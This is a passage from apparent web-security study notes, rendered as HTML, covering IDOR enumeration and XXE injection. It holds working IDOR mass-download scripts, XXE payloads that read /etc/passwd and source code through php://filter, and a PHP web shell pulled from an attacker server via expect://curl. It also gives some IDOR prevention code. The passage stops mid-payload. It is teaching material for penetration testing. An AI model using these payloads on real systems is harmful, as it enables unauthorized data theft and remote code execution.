+</span></pre></table></code></div></div><p>With a simple bash script:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>
+
+<span class="nv">url</span><span class="o">=</span><span class="s2">"http://&lt;TARGET&gt;"</span>
+
+<span class="k">for </span>i <span class="k">in</span> <span class="o">{</span>1..10<span class="o">}</span><span class="p">;</span> <span class="k">do
+        for </span><span class="nb">link </span><span class="k">in</span> <span class="si">$(</span>curl <span class="nt">-s</span> <span class="s2">"</span><span class="nv">$url</span><span class="s2">/documents.php?uid=</span><span class="nv">$i</span><span class="s2">"</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s2">"</span><span class="se">\/</span><span class="s2">documents.*?.pdf"</span><span class="si">)</span><span class="p">;</span> <span class="k">do
+                </span>wget <span class="nt">-q</span> <span class="nv">$url</span>/<span class="nv">$link</span>
+        <span class="k">done
+done</span>
+</pre></table></code></div></div><h2 id="bypassing-encoded-references"><span class="mr-2">Bypassing Encoded References</span><a href="#bypassing-encoded-references" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>In some cases, web applications make hashes or encode their object references, making enumeration more difficult, but it may still be possible. For example, after download a file we intercept in the POST:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>contract=cdd96d3cc73d1dbdaffa03cc6cd7339b
+</pre></table></code></div></div><p>Testing the format we find that It doesn’t match with our id:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span><span class="nb">echo</span> <span class="nt">-n</span> 1 | <span class="nb">md5sum</span>
+<span class="go">
+c4ca4238a0b923820dcc509a6f75849b -
+</span></pre></table></code></div></div><h3 id="function-disclosure"><span class="mr-2">Function Disclosure</span><a href="#function-disclosure" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>As most modern web applications are developed using JavaScript frameworks, like <strong>Angular</strong>, <strong>React</strong>, or <strong>Vue.js</strong>, many web developers may make the mistake of performing sensitive functions on the front-end, which would expose them to attackers. We can find a download script, reference as <code class="language-plaintext highlighter-rouge">javascript:downloadContract('1')</code>. Searching in the source code we find that:</p><div class="language-javascript highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre><span class="kd">function</span> <span class="nx">downloadContract</span><span class="p">(</span><span class="nx">uid</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">$</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span><span class="dl">"</span><span class="s2">/download.php</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span>
+        <span class="na">contract</span><span class="p">:</span> <span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">MD5</span><span class="p">(</span><span class="nx">btoa</span><span class="p">(</span><span class="nx">uid</span><span class="p">)).</span><span class="nx">toString</span><span class="p">(),</span>
+    <span class="p">},</span> <span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">_self</span><span class="dl">"</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></table></code></div></div><p>We see it is encrypting <code class="language-plaintext highlighter-rouge">btoa(uid)</code>, which is the uid in base64. With all this information we can guess the hash:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span><span class="nb">echo</span> <span class="nt">-n</span> 1 | <span class="nb">base64</span> <span class="nt">-w</span> 0 | <span class="nb">md5sum</span>
+<span class="go">
+cdd96d3cc73d1dbdaffa03cc6cd7339b -
+</span></pre></table></code></div></div><blockquote class="prompt-tip"><div><p>We are using the -n flag with echo, and the -w 0 flag with base64, to avoid adding newlines</p></div></blockquote><h3 id="mass-enumeration-1"><span class="mr-2">Mass Enumeration</span><a href="#mass-enumeration-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Once again we can start enumerating all the data. We can generate a list of hashes for each user:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span><span class="k">for </span>i <span class="k">in</span> <span class="o">{</span>1..10<span class="o">}</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="nv">$i</span> | <span class="nb">base64</span> <span class="nt">-w</span> 0 | <span class="nb">md5sum</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">' -'</span><span class="p">;</span> <span class="k">done</span>
+<span class="go">
+cdd96d3cc73d1dbdaffa03cc6cd7339b
+0b7e7dee87b1c3b98e72131173dfbbbf
+0b24df25fe628797b3a50ae0724d2730
+f7947d50da7a043693a592b4db43b0a1
+8b9af1f7f76daf0f02bd9c48c4a2e3d0
+006d1236aee3f92b8322299796ba1989
+b523ff8d1ced96cef9c86492e790c2fb
+d477819d240e7d3dd9499ed8d23e7158
+3e57e65a34ffcb2e93cb545d024f5bde
+5d4aace023dc088767b4e08c79415dcd
+</span></pre></table></code></div></div><p>Or create a script:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>
+
+<span class="k">for </span>i <span class="k">in</span> <span class="o">{</span>1..10<span class="o">}</span><span class="p">;</span> <span class="k">do
+    for </span><span class="nb">hash </span><span class="k">in</span> <span class="si">$(</span><span class="nb">echo</span> <span class="nt">-n</span> <span class="nv">$i</span> | <span class="nb">base64</span> <span class="nt">-w</span> 0 | <span class="nb">md5sum</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">' -'</span><span class="si">)</span><span class="p">;</span> <span class="k">do
+        </span>curl <span class="nt">-sOJ</span> <span class="nt">-X</span> POST <span class="nt">-d</span> <span class="s2">"contract=</span><span class="nv">$hash</span><span class="s2">"</span> http://&lt;TARGET&gt;:PORT/download.php
+    <span class="k">done
+done</span>
+</pre></table></code></div></div><h2 id="idor-in-insecure-apis"><span class="mr-2">IDOR in Insecure APIs</span><a href="#idor-in-insecure-apis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>IDOR vulnerabilities may also exist in function calls and APIs, and exploiting them would allow us to perform various actions as other users. While <strong>IDOR Information Disclosure Vulnerabilities</strong> allow us to read various types of resources, <strong>IDOR Insecure Function Calls</strong> enable us to call APIs or execute functions as another user.</p><h3 id="identifying-insecure-apis"><span class="mr-2">Identifying Insecure APIs</span><a href="#identifying-insecure-apis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Take for example a <strong>Edit Profile</strong> option. We intercept the request with Burp and see a JSON with all the information update, the parameter <strong>PUT</strong> and a URL like <code class="language-plaintext highlighter-rouge">/profile/api.php/profile/1</code>. Also the <strong>PUT</strong> has some hidden parameters, like <strong>role</strong> or <strong>uuid</strong>.</p><h3 id="exploiting-insecure-apis"><span class="mr-2">Exploiting Insecure APIs</span><a href="#exploiting-insecure-apis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>There are a few things we could try in this case:</p><ul><li>Change our uid to another user’s uid, such that we can take over their accounts<li>Change another user’s details, which may allow us to perform several web attacks<li>Create new users with arbitrary details, or delete existing users<li>Change our role to a more privileged role to be able to perform more actions<li>Use <strong>GET</strong> to try IDOR Information Disclosure vulnerabilities</ul><p>The application may have some protections, not allowing to perform some of this. Try with all of them.</p><h2 id="chaining-idor-vulnerabilities"><span class="mr-2">Chaining IDOR Vulnerabilities</span><a href="#chaining-idor-vulnerabilities" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Taking the example for before, we got blocked trying to update other user data, because even though we know their uid, the uuid doesn’t match. After gathering all his info with the <strong>GET</strong>, we can modify our request to change their data.</p><h3 id="chaining-two-idor-vulnerabilities"><span class="mr-2">Chaining Two IDOR Vulnerabilities</span><a href="#chaining-two-idor-vulnerabilities" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>We can enumerate all the users. If we get a admin user we can modify our data to have the sames access as him.</p><p>By combining the information we gained from the <strong>IDOR Information Disclosure vulnerability</strong> with an <strong>IDOR Insecure Function Calls</strong> attack on an API endpoint, we could modify other users’ details and create/delete users while bypassing various access control checks in place. On many occasions, the information we leak through IDOR vulnerabilities can be utilized in other attacks, like <strong>IDOR</strong> or <strong>XSS</strong>, leading to more sophisticated attacks or bypassing existing security mechanisms.</p><h2 id="idor-prevention"><span class="mr-2">IDOR Prevention</span><a href="#idor-prevention" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="object-level-access-control"><span class="mr-2">Object-Level Access Control</span><a href="#object-level-access-control" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>An Access Control system should be at the core of any web application since it can affect its entire design and structure. There are many ways to implement an RBAC system and map it to the web application’s objects and resources, and designing it in the core of the web application’s structure is an art to perfect. The following is a sample code of how a web application may compare user roles to objects to allow or deny access control:</p><div class="language-javascript highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre><span class="nx">match</span> <span class="o">/</span><span class="nx">api</span><span class="o">/</span><span class="nx">profile</span><span class="o">/</span><span class="p">{</span><span class="nx">userId</span><span class="p">}</span> <span class="p">{</span>
+    <span class="nx">allow</span> <span class="nx">read</span><span class="p">,</span> <span class="na">write</span><span class="p">:</span> <span class="k">if</span> <span class="nx">user</span><span class="p">.</span><span class="nx">isAuth</span> <span class="o">==</span> <span class="kc">true</span>
+    <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">user</span><span class="p">.</span><span class="nx">uid</span> <span class="o">==</span> <span class="nx">userId</span> <span class="o">||</span> <span class="nx">user</span><span class="p">.</span><span class="nx">roles</span> <span class="o">==</span> <span class="dl">'</span><span class="s1">admin</span><span class="dl">'</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></table></code></div></div><p>User privileges must not be passed through the HTTP request, but mapped directly from the RBAC on the back-end using the user’s logged-in session token as an authentication mechanism.</p><h3 id="object-referencing"><span class="mr-2">Object Referencing</span><a href="#object-referencing" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>While the core issue with IDOR lies in broken access control (<strong>Insecure</strong>), having access to direct references to objects (<strong>Direct Object Referencing</strong>) makes it possible to enumerate and exploit these access control vulnerabilities. We may still use direct references, but only if we have a solid access control system implemented. For example, we can use UUID V4 to generate a strongly randomized id for any element, which looks something like <code class="language-plaintext highlighter-rouge">89c9b29b-d19f-4515-b2dd-abb6e693eb20</code>. Then, we can map this UUID to the object it is referencing in the back-end database, and whenever this UUID is called, the back-end database would know which object to return. The following example PHP code shows us how this may work:</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre><span class="nv">$uid</span> <span class="o">=</span> <span class="nb">intval</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'uid'</span><span class="p">]);</span>
+<span class="nv">$query</span> <span class="o">=</span> <span class="s2">"SELECT url FROM documents where uid="</span> <span class="mf">.</span> <span class="nv">$uid</span><span class="p">;</span>
+<span class="nv">$result</span> <span class="o">=</span> <span class="nf">mysqli_query</span><span class="p">(</span><span class="nv">$conn</span><span class="p">,</span> <span class="nv">$query</span><span class="p">);</span>
+<span class="nv">$row</span> <span class="o">=</span> <span class="nf">mysqli_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">));</span>
+<span class="k">echo</span> <span class="s2">"&lt;a href='"</span> <span class="mf">.</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">'url'</span><span class="p">]</span> <span class="mf">.</span> <span class="s2">"' target='_blank'&gt;&lt;/a&gt;"</span><span class="p">;</span>
+</pre></table></code></div></div><hr /><h1 id="xml-external-entity-xxe-injection">XML External Entity (XXE) Injection</h1><p><strong>XXE Injection</strong> vulnerabilities occur when XML data is taken from a user-controlled input without properly sanitizing or safely parsing it, which may allow us to use XML features to perform malicious actions. <strong>Extensible Markup Language</strong> (<strong>XML</strong>) is a common markup language (similar to HTML and SGML) designed for flexible transfer and storage of data and documents in various types of applications. XML documents are formed of element trees, where each element is essentially denoted by a tag, and the first element is called the root element, while other elements are child elements. An example:</p><div class="language-xml highlighter-rouge"><div class="code-header"> <span data-label-text="XML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+</pre><td class="rouge-code"><pre><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+<span class="nt">&lt;email&gt;</span>
+  <span class="nt">&lt;date&gt;</span>01-01-2022<span class="nt">&lt;/date&gt;</span>
+  <span class="nt">&lt;time&gt;</span>10:00 am UTC<span class="nt">&lt;/time&gt;</span>
+  <span class="nt">&lt;sender&gt;</span>john@zerop.io<span class="nt">&lt;/sender&gt;</span>
+  <span class="nt">&lt;recipients&gt;</span>
+    <span class="nt">&lt;to&gt;</span>HR@zerop.io<span class="nt">&lt;/to&gt;</span>
+    <span class="nt">&lt;cc&gt;</span>
+        <span class="nt">&lt;to&gt;</span>billing@zerop.io<span class="nt">&lt;/to&gt;</span>
+        <span class="nt">&lt;to&gt;</span>payslips@zerop.io<span class="nt">&lt;/to&gt;</span>
+    <span class="nt">&lt;/cc&gt;</span>
+  <span class="nt">&lt;/recipients&gt;</span>
+  <span class="nt">&lt;body&gt;</span>
+  Hello,
+      Kindly share with me the invoice for the payment made on January 1, 2022.
+  Regards,
+  John
+  <span class="nt">&lt;/body&gt;</span> 
+<span class="nt">&lt;/email&gt;</span>
+</pre></table></code></div></div><p>Some elements of a XML file are:</p><div class="table-wrapper"><table><thead><tr><th><strong>Key</strong><th><strong>Definition</strong><th><strong>Example</strong><tbody><tr><td>Tag<td>The keys of an XML document, usually wrapped with (<code class="language-plaintext highlighter-rouge">&lt;</code>/<code class="language-plaintext highlighter-rouge">&gt;</code>) characters<td><code class="language-plaintext highlighter-rouge">&lt;date&gt;</code><tr><td>Entity<td>XML variables, usually wrapped with (<code class="language-plaintext highlighter-rouge">&amp;</code>/<code class="language-plaintext highlighter-rouge">;</code>) characters<td><code class="language-plaintext highlighter-rouge">&amp;lt;</code><tr><td>Element<td>The root element or any of its child elements, and its value is stored in between a start-tag and an end-tag<td><code class="language-plaintext highlighter-rouge">&lt;date&gt;01-01-2022&lt;/date&gt;</code><tr><td>Attribute<td>Optional specifications for any element that are stored in the tags, which may be used by the XML parser<td><code class="language-plaintext highlighter-rouge">version="1.0"</code>/<code class="language-plaintext highlighter-rouge">encoding="UTF-8"</code><tr><td>Declaration<td>Usually the first line of an XML document, and defines the XML version and encoding to use when parsing it<td><code class="language-plaintext highlighter-rouge">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</code></table></div><p>Furthermore, some characters are used as part of an XML document structure, like <code class="language-plaintext highlighter-rouge">&lt;</code>, <code class="language-plaintext highlighter-rouge">&gt;</code>, <code class="language-plaintext highlighter-rouge">&amp;</code>, or <code class="language-plaintext highlighter-rouge">"</code>. So, if we need to use them in an XML document, we should replace them with their corresponding entity references (e.g. <code class="language-plaintext highlighter-rouge">&amp;lt;</code>, <code class="language-plaintext highlighter-rouge">&amp;gt;</code>, <code class="language-plaintext highlighter-rouge">&amp;amp;</code>, <code class="language-plaintext highlighter-rouge">&amp;quot;</code>). Finally, we can write comments in XML documents between <code class="language-plaintext highlighter-rouge">&lt;!--</code> and <code class="language-plaintext highlighter-rouge">--&gt;</code>, similar to HTML documents.</p><p><strong>XML Document Type Definition</strong> (<strong>DTD</strong>) allows the validation of an XML document against a pre-defined document structure. The pre-defined document structure can be defined in the document itself or in an external file. The following is an example DTD for the XML document we saw earlier:</p><div class="language-xml highlighter-rouge"><div class="code-header"> <span data-label-text="XML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre><span class="cp">&lt;!DOCTYPE email [
+  &lt;!ELEMENT email (date, time, sender, recipients, body)&gt;</span>
+  <span class="cp">&lt;!ELEMENT recipients (to, cc?)&gt;</span>
+  <span class="cp">&lt;!ELEMENT cc (to*)&gt;</span>
+  <span class="cp">&lt;!ELEMENT date (#PCDATA)&gt;</span>
+  <span class="cp">&lt;!ELEMENT time (#PCDATA)&gt;</span>
+  <span class="cp">&lt;!ELEMENT sender (#PCDATA)&gt;</span>
+  <span class="cp">&lt;!ELEMENT to  (#PCDATA)&gt;</span>
+  <span class="cp">&lt;!ELEMENT body (#PCDATA)&gt;</span>
+]&gt;
+</pre></table></code></div></div><p>As we can see, the DTD is declaring the root <strong>email</strong> element with the <strong>ELEMENT</strong> type declaration and then denoting its child elements. After that, each of the child elements is also declared, where some of them also have child elements, while others may only contain raw data (as denoted by <strong>PCDATA</strong>).</p><p>We may also define custom entities in XML DTDs, to allow refactoring of variables and reduce repetitive data. This can be done with the use of the ENTITY keyword, which is followed by the entity name and its value, as follows:</p><div class="language-xml highlighter-rouge"><div class="code-header"> <span data-label-text="XML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE email [
+  &lt;!ENTITY company "Zeropio"&gt;</span>
+]&gt;
+</pre></table></code></div></div><p>Once we define an entity, it can be referenced in an XML document between an ampersand <code class="language-plaintext highlighter-rouge">&amp;</code> and a semi-colon <code class="language-plaintext highlighter-rouge">;</code> (e.g. <code class="language-plaintext highlighter-rouge">&amp;company;</code>). Whenever an entity is referenced, it will be replaced with its value by the XML parser. Most interestingly, however, we can reference External XML Entities with the <strong>SYSTEM</strong> keyword, which is followed by the external entity’s path, as follows:</p><div class="language-xml highlighter-rouge"><div class="code-header"> <span data-label-text="XML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE email [
+  &lt;!ENTITY company SYSTEM "http://localhost/company.txt"&gt;</span>
+  <span class="cp">&lt;!ENTITY signature SYSTEM "file:///var/www/html/signature.txt"&gt;</span>
+]&gt;
+</pre></table></code></div></div><blockquote class="prompt-tip"><div><p>We may also use the <strong>PUBLIC</strong> keyword instead of <strong>SYSTEM</strong> for loading external resources, which is used with publicly declared entities and standards, such as a language code</p></div></blockquote><h2 id="local-file-disclosure"><span class="mr-2">Local File Disclosure</span><a href="#local-file-disclosure" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>When a web application trusts unfiltered XML data from user input, we may be able to reference an external XML DTD document and define new custom XML entities. The first step in identifying potential XXE vulnerabilities is finding web pages that accept an XML user input. For example a <strong>Contact Form</strong>. Take the following example:</p><div class="language-xml highlighter-rouge"><div class="code-header"> <span data-label-text="XML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+<span class="nt">&lt;root&gt;</span>
+  <span class="nt">&lt;name&gt;</span>Zero<span class="nt">&lt;/name&gt;</span>
+  <span class="nt">&lt;tel&gt;</span>1<span class="nt">&lt;/tel&gt;</span>
+  <span class="nt">&lt;email&gt;</span>zero@pm.me<span class="nt">&lt;/email&gt;</span>
+  <span class="nt">&lt;message&gt;</span>
+    Pwned!
+  <span class="nt">&lt;/message&gt;</span>
+<span class="nt">&lt;/root&gt;</span>
+</pre></table></code></div></div><p>Intercept the request and check it. If we see XML format we can start testing. Suppose the web application uses outdated XML libraries, and it does not apply any filters or sanitization on our XML input. In that case, we may be able to exploit this XML form to read local files. Take for example that one of the field is being printed after sending it (for example our email after the Contact Form). Also check the source code, some values can be displaying there.</p><p>Start creating a new Entity, for example <code class="language-plaintext highlighter-rouge">&lt;!ENTITY test "This is a test"&gt;</code>.</p><blockquote class="prompt-tip"><div><p>If in the HTTP request had no DTD being declared within the XML data itself, or being referenced externally, so we added a new DTD before defining our entity. If the <strong>DOCTYPE</strong> was already declared in the XML request, we would just add the <strong>ENTITY</strong> element to it.</p></div></blockquote><p>For example:</p><div class="language-xml highlighter-rouge"><div class="code-header"> <span data-label-text="XML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre><td class="rouge-code"><pre><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE email [
+  &lt;!ENTITY test "This is a test"&gt;</span>
+]&gt;
+<span class="nt">&lt;root&gt;</span>
+  <span class="nt">&lt;name&gt;</span>Zero<span class="nt">&lt;/name&gt;</span>
+  <span class="nt">&lt;tel&gt;</span>1<span class="nt">&lt;/tel&gt;</span>
+  <span class="nt">&lt;email&gt;</span><span class="ni">&amp;test;</span><span class="nt">&lt;/email&gt;</span>
+  <span class="nt">&lt;message&gt;</span>
+    Pwned!
+  <span class="nt">&lt;/message&gt;</span>
+<span class="nt">&lt;/root&gt;</span>
+</pre></table></code></div></div><p>If the ENTITY test is display, we have our XXE.</p><blockquote class="prompt-tip"><div><p>Some web applications may default to a JSON format in HTTP request, but may still accept other formats, including XML. So, even if a web app sends requests in a JSON format, we can try changing the Content-Type header to application/xml, and then convert the JSON data to XML with an online tool. If the web application does accept the request with XML data, then we may also test it against XXE vulnerabilities, which may reveal an unanticipated XXE vulnerability.</p></div></blockquote><h3 id="reading-sensitive-files"><span class="mr-2">Reading Sensitive Files</span><a href="#reading-sensitive-files" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>We’ll just add the SYSTEM keyword and define the external reference path after it:</p><div class="language-xml highlighter-rouge"><div class="code-header"> <span data-label-text="XML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre><span class="cp">&lt;!DOCTYPE email [
+  &lt;!ENTITY company SYSTEM "file:///etc/passwd"&gt;</span>
+]&gt;
+</pre></table></code></div></div><blockquote class="prompt-tip"><div><p>In certain Java web applications, we may also be able to specify a directory instead of a file, and we will get a directory listing instead, which can be useful for locating sensitive files.</p></div></blockquote><h3 id="reading-source-code"><span class="mr-2">Reading Source Code</span><a href="#reading-source-code" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Another benefit of local file disclosure is the ability to obtain the source code of the web application. So, let us see if we can use the same attack to read the source code of the index.php file, as follows:</p><div class="language-xml highlighter-rouge"><div class="code-header"> <span data-label-text="XML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre><span class="cp">&lt;!DOCTYPE email [
+  &lt;!ENTITY company SYSTEM "file://index.php"&gt;</span>
+]&gt;
+</pre></table></code></div></div><p>This don’t work because the file we are referencing is not in a proper XML format, so it fails to be referenced as an external XML entity. If a file contains some of XML’s special characters (<code class="language-plaintext highlighter-rouge">&lt;</code>/<code class="language-plaintext highlighter-rouge">&gt;</code>/<code class="language-plaintext highlighter-rouge">&amp;</code>), it would break the external entity reference and not be used for the reference. PHP provides wrapper filters that allow us to base64 encode certain resources ‘including files’, in which case the final base64 output should not break the XML format:</p><div class="language-xml highlighter-rouge"><div class="code-header"> <span data-label-text="XML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre><span class="cp">&lt;!DOCTYPE email [
+  &lt;!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt;</span>
+]&gt;
+</pre></table></code></div></div><p><strong>This trick only works with PHP web applications</strong>.</p><h3 id="remote-code-execution-with-xxe"><span class="mr-2">Remote Code Execution with XXE</span><a href="#remote-code-execution-with-xxe" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>n addition to reading local files, we may be able to gain code execution over the remote server. The easiest method would be to look for ssh keys, or attempt to utilize a hash stealing trick in Windows-based web applications, by making a call to our server. If these do not work, we may still be able to execute commands on PHP-based web applications through the <code class="language-plaintext highlighter-rouge">PHP://expect</code> filter, though this requires the PHP expect module to be installed and enabled.</p><p>If the XXE directly prints its output ‘as shown in this section’, then we can execute basic commands as <code class="language-plaintext highlighter-rouge">expect://id</code>, and the page should print the command output. However, if we did not have access to the output, or needed to execute a more complicated command (reverse shell), then the XML syntax may break and the command may not execute.</p><p>The most efficient method to turn XXE into RCE is by fetching a web shell from our server and writing it to the web app, and then we can interact with it to execute commands. To do so, we can start by writing a basic PHP web shell and starting a python web server, as follows:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span><span class="nb">echo</span> <span class="s1">'&lt;?php system($_REQUEST["cmd"]);?&gt;'</span> <span class="o">&gt;</span> shell.php 
+<span class="gp">zero@pio$</span><span class="w"> </span>python3 <span class="nt">-m</span> http.server 80
+</pre></table></code></div></div><p>Now use the following XML:</p><div class="language-xml highlighter-rouge"><div class="code-header"> <span data-label-text="XML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre><span class="cp">&lt;?xml version="1.0"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE email [
+  &lt;!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'&lt;OUR IP&gt;</span>/shell.php'"&gt;
+]&gt;
+<span class="nt">&lt;root&gt;</span>
